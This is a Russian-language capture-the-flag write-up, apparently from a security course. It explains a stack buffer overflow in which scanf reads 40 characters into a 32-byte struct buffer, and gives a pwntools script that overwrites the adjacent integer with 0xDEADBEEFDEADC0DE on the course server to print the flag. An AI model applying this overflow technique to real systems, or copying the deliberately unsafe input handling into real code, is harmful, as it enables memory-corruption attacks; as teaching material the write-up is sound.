Посмотрим в main.c:

```c
int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    struct {    
        char buffer[32];
        uint64_t n;
    } s;

    s.n = 0xcafebabedecafbad;
    if (scanf("%40s", s.buffer) != 1) {
        return EXIT_FAILURE;
    }

    if (s.n == 0xdeadbeefdeadc0de) {
        print_flag();
    } else {
        puts("no flag for you!");
    }

    return EXIT_SUCCESS;
}
```

Видим, что у нас в функции объявляется структура с буффером размера 32 байта и число размером 8 байтов. Они хранятся в стеке друг за дургом. Дальше видно, что происходит скан 40 символов, то есть на вход ожидается 40 байтов. Программа хочет от нас, чтобы после того, как от нас получат ввод, число в структуре было равно 0xDEADBEEFDEADC0DE. Так давайте это сделаем! Питон и pwn (pip install pwntools), ваш выход:

```python
from pwn import *

def main():
    # r = process("./shell_exec")
    r = remote("is-course.ru", 2402)
    r.send(b'1'*32+p64(0xDEADBEEFDEADC0DE))

    r.interactive()

if __name__ == '__main__':
    main()
```
В консоли получаем флаг.

Здесь важно упомянуть про p64. Эта функция пакует число из 8 байт в  байты, чтобы его можно было отправить через r.send()